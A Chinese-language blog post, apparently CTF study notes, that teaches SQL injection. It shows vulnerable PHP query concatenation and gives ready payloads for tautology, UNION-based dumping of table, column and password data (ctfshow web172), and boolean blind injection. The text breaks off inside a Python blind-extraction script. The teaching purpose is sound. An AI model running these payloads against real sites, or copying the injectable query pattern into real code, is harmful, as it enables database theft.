<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="伊卡洛维奇"><meta name="copyright" content="伊卡洛维奇"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>sql注入整理 | Ikalovic@Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"lunereal.1kal0vic.top","root":"/","title":"kawayi","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="简介SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。 其中常见的mysql数据库便是如此。 而sql注入就是结合sql语法，构造恶意输入，使得服务器返回本不应该返回的信息。 sql的基本语法可以参考：SQL 语法 | 菜鸟教程  数据类型从大到小为：数据库（database）–&gt; 表（table) –&gt; 列（">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入整理">
<meta property="og:url" content="http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Ikalovic@Hexo">
<meta property="og:description" content="简介SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。 其中常见的mysql数据库便是如此。 而sql注入就是结合sql语法，构造恶意输入，使得服务器返回本不应该返回的信息。 sql的基本语法可以参考：SQL 语法 | 菜鸟教程  数据类型从大到小为：数据库（database）–&gt; 表（table) –&gt; 列（">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/Users/30882/Desktop/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/source/images/img/sql%E6%B3%A8%E5%85%A5/1.png">
<meta property="article:published_time" content="2026-02-21T06:46:23.000Z">
<meta property="article:modified_time" content="2026-02-21T12:04:03.377Z">
<meta property="article:author" content="伊卡洛维奇">
<meta property="article:tag" content="-web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/Users/30882/Desktop/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/source/images/img/sql%E6%B3%A8%E5%85%A5/1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="伊卡洛维奇"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="伊卡洛维奇"><span class="site-author-status" title="loli赛高">☺️</span></a><div class="site-author-name"><a href="/about/">伊卡洛维奇</a></div><span class="site-name">Ikalovic@Hexo</span><sub class="site-subtitle">kawayi</sub><div class="site-description">loli赛高</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">6</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/girls/"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:women-line"></span></span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Ikalovic" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/327357699" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">sql注入的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.0.1.</span> <span class="toc-text">最基础的查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.2.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.0.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.5.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.0.6.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.0.7.</span> <span class="toc-text">进行替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.8.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.9.</span> <span class="toc-text">二次绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.0.10.</span> <span class="toc-text">读写文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.11.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.0.12.</span> <span class="toc-text">绕过空格</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">3.0.1.</span> <span class="toc-text">sqlmap</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="伊卡洛维奇"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Ikalovic@Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sql注入整理</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2026-02-21 14:46:23" itemprop="dateCreated datePublished" datetime="2026-02-21T14:46:23+08:00">2026-02-21</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">-知识积累</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">-web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。</p>
<p>其中常见的mysql数据库便是如此。</p>
<p>而sql注入就是结合sql语法，构造恶意输入，使得服务器返回本不应该返回的信息。</p>
<p>sql的基本语法可以参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/sql/sql-syntax.html">SQL 语法 | 菜鸟教程</a></p>
<p><img src="Users\30882\Desktop\个人博客\source\images\img\sql注入\1.png" alt="1" loading="lazy"></p>
<p>数据类型从大到小为：<br>数据库（database）–&gt; 表（table) –&gt; 列（column） –&gt; 数据</p>
<p>也就是我们要定位一个数据，要知道它所处的数据库，表，乃至列。</p>
<p>其中，sql有一个特殊的数据库：information_schema，它存储着所有的数据库名，表名</p>
<p>以下为information_schema库的常用表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.schemate</span><br><span class="line">  描述：提供了当前MySQL实例中所有数据库的信息。</span><br><span class="line">  关键字段：</span><br><span class="line">    schema_name：数据库名。</span><br><span class="line">    default_character_set_name：数据库的默认字符集。</span><br><span class="line">    default_collation_name：数据库的默认校对规则。</span><br><span class="line">  用途：用于查询所有数据库的名称。</span><br><span class="line">2.tables</span><br><span class="line">  描述：提供了关于数据库中的表的信息（包括视图）。</span><br><span class="line">  关键字段：</span><br><span class="line">    table_schemea：数据库名。</span><br><span class="line">    table_name：表名。</span><br><span class="line">    table_type：表类型（如base table表示基本表，view表示视图）。</span><br><span class="line">    engine：表的存储引擎。</span><br><span class="line">  用途：用于查询指定数据库中的所有表名。</span><br><span class="line">3.columns</span><br><span class="line">  描述：提供了表中的列信息。</span><br><span class="line">  关键字段：</span><br><span class="line">    table_schema：数据库名。</span><br><span class="line">    table_name：表名。</span><br><span class="line">    column_name：列名。</span><br><span class="line">    data_type：列的数据类型。</span><br><span class="line">    character_maximum_length：字符类型的最大长度（对于非字符类型，该值为null）。</span><br><span class="line">    is_nullable：列是否允许null值。</span><br><span class="line">  用途：用于查询指定表中的所有列名和数据类型等信息。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h1><h3 id="最基础的查询"><a href="#最基础的查询" class="headerlink" title="最基础的查询"></a>最基础的查询</h3><p>比如说，下方的语句是一个根据用户输入的id来查找用户名和密码的语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>其中的id是受我们控制的。程序本意是通过id来定位对应的用户名和密码。</p>
<p>但是，我们可以构造一个简单的恶意输入，即1’ or 1&#x3D;1 –+ 。</p>
<p><strong>其中，–是注释符号，+会被url解码成空格，以此防止–和‘直接接触引发报错。当然，你用#来注释也是可以的</strong></p>
<p>当我们输入这个的时候，语句也就变成了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;1&#x27; or 1=1 -- &#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>忽略掉注释内容，也就变成了：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>1&#x3D;1是永真式，因此也就查找出了所有语句，包括username&#x3D;flag的数据。</p>
<p>这个为字符型闭合。与之相对的是数字型闭合。</p>
<p>两者的区别很简单，就是要不要加引号。</p>
<p>比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这时候使用id&#x3D; 1 or 1&#x3D;1 –+即可，无需引号。</p>
<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>在sql有一种特殊的查询手段叫联合查询：UNION </p>
<p>它将两张表的某些字段的记录相加（并集）（注意：列数要相同）</p>
<p>因此也是我们注入时候常用的手段。</p>
<p>在使用时，我们往往会使用order来判断有多少列数据。</p>
<p>比如<br>输入?id&#x3D;1’ order by 3 –+<br>输入?id&#x3D;1’ order by 4 –+<br>发现输入第一句时回显正常，输入第二句时报错。</p>
<p>可以证明前面查询了三列数据。</p>
<p>或者我们可以一个个尝试，一般而言不会太多。</p>
<p>以ctfshow的web172为例子。</p>
<p>其中查询语句：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以发现我们之前使用的方法不能用了，因为它会检测返回的结果。</p>
<p>因此，我们要想个办法，使得username不为flag但是password为flag内容</p>
<p>使用联合查询。</p>
<p>先查所在的数据库名字：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database() , --+</span><br></pre></td></tr></table></figure>

<p>发现报错，于是添加数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database() , --+</span><br></pre></td></tr></table></figure>

<p>查出数据库名为 ctfshow_web。</p>
<p>然后查表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p>发现有两个表，</p>
<p>分别为 ctfshow_user和ctfshow_user2</p>
<p>这时候两个都尝试一下就好了。</p>
<p>查table</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>ctfshow_web<span class="string">&#x27; and table_name=&#x27;</span>ctfshow_user2<span class="string">&#x27;--+ </span></span><br></pre></td></tr></table></figure>

<p>查数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(password) from ctfshow_user2--+</span></span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>如果网站只有两个不同的返回结果，就可以采用布尔盲注。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 判断数据库长度</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database()) &gt; 5 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 逐个字符猜解数据库名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1)) = 115 --+  # 115对应&#x27;</span>s<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 判断表名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"># 判断列名</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1)) &gt; 100 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 获取数据</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">100</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>python脚本模板:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line"><span class="keyword">import</span> time      <span class="comment"># 导入time库，用于添加延时控制</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdvancedBooleanBlind</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    高级布尔盲注类</span></span><br><span class="line"><span class="string">    功能：通过布尔盲注技术，从存在SQL注入漏洞的网站中提取数据</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, true_indicator, false_indicator=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        初始化方法，创建注入器实例时自动调用</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            url: 目标URL地址，例如 &quot;http://target.com/page.php&quot;</span></span><br><span class="line"><span class="string">            true_indicator: 判断条件为真时的页面特征字符串</span></span><br><span class="line"><span class="string">                           (比如正确页面包含&quot;Welcome&quot;字样)</span></span><br><span class="line"><span class="string">            false_indicator: (可选)判断条件为假时的页面特征字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.url = url              <span class="comment"># 保存目标URL到实例变量</span></span><br><span class="line">        <span class="variable language_">self</span>.true_indicator = true_indicator  <span class="comment"># 保存真值判断特征</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">binary_search</span>(<span class="params">self, query, pos</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        使用二分法快速猜解指定位置的字符</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        二分法原理：</span></span><br><span class="line"><span class="string">        1. 从ASCII码32-126的范围开始</span></span><br><span class="line"><span class="string">        2. 每次取中间值，判断字符是否大于中间值</span></span><br><span class="line"><span class="string">        3. 根据判断结果缩小范围，直到精确找到字符</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            query: SQL查询语句，例如 &quot;SELECT password FROM users&quot;</span></span><br><span class="line"><span class="string">            pos: 